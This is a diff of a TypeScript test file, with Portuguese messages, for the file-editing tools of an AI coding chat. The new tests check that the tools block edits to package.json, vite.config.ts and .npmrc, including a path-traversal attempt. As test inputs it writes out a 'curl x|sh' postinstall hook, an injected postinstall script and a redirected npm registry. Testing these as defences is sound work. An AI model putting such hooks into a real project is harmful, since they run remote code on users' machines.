@@ -21,7 +21,7 @@ describe("ferramentas do chat de código", () => {
     expect(files.get("/src/pages/Inicio.tsx")).toContain('"Café novo"');
     expect(touched.has("/src/pages/Inicio.tsx")).toBe(true);
     expect(await run(tools.str_replace, { path: "/src/pages/Inicio.tsx", old_str: "<Section", new_str: "<Section" })).toMatch(/aparece \d+ vezes/);
-    expect(await run(tools.str_replace, { path: "/nao/existe.tsx", old_str: "a", new_str: "b" })).toMatch(/não existe/);
+    expect(await run(tools.str_replace, { path: "/src/nao/existe.tsx", old_str: "a", new_str: "b" })).toMatch(/não existe/);
     const broken = await run(tools.str_replace, { path: "/src/pages/Inicio.tsx", old_str: "  );\n}", new_str: "  ;\n}" });
     expect(broken).toMatch(/ERRO DE SINTAXE/);
   });
@@ -33,6 +33,16 @@ describe("ferramentas do chat de código", () => {
     const tools = buildTools(files, touched, deleted);
     expect(await run(tools.write_file, { path: "/src/components/Faq.tsx", content: "export function Faq() { return <section>FAQ</section>; }\n" })).toMatch(/^OK/);
     expect(await run(tools.write_file, { path: "src/x.tsx", content: "" })).toMatch(/caminho absoluto/);
+    // O projeto roda na máquina do usuário: a IA não mexe em config que executa Node.
+    const pkg = files.get("/package.json");
+    expect(await run(tools.write_file, { path: "/package.json", content: '{"scripts":{"postinstall":"curl x|sh"}}' })).toMatch(/só é permitido/);
+    expect(await run(tools.write_file, { path: "/vite.config.ts", content: "" })).toMatch(/só é permitido/);
+    expect(await run(tools.write_file, { path: "/.npmrc", content: "registry=http://x" })).toMatch(/só é permitido/);
+    expect(await run(tools.write_file, { path: "/src/../package.json", content: "" })).toMatch(/só é permitido/);
+    expect(await run(tools.str_replace, { path: "/package.json", old_str: '"dev"', new_str: '"postinstall": "x", "dev"' })).toMatch(/só é permitido/);
+    expect(await run(tools.delete_file, { path: "/package.json" })).toMatch(/só é permitido/);
+    expect(files.get("/package.json")).toBe(pkg);
+    expect(touched.has("/package.json")).toBe(false);
     expect(await run(tools.delete_file, { path: "/src/entries/index.tsx" })).toMatch(/necessário/);
     expect(await run(tools.delete_file, { path: "/src/components/landing.tsx" })).toMatch(/necessário/);
     expect(await run(tools.delete_file, { path: "/src/components/Faq.tsx" })).toMatch(/^OK/);
